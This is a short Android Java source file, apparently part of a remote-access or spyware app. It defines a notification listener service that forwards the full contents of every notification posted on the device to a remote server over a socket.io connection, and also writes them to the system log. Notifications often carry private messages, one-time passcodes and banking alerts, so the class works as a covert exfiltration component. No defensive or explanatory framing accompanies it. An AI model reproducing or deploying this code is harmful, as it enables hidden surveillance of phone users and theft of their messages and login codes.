package com.brocode.models;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.brocode.startups.ConManager;

import io.socket.client.Socket;

public class NotificationListener extends NotificationListenerService {

	public static Socket socket = ConManager.getSocket();

	@Override
	public void onNotificationPosted(StatusBarNotification sb) {
		Log.d("noT", "N : " + sb.toString());
		socket.emit("log", sb.toString());
	}

	@Override
	public void onNotificationRemoved(StatusBarNotification sbn, RankingMap rankingMap) {
		onNotificationRemoved(sbn);
		Log.d("not", ": " + sbn.toString());
	}
}
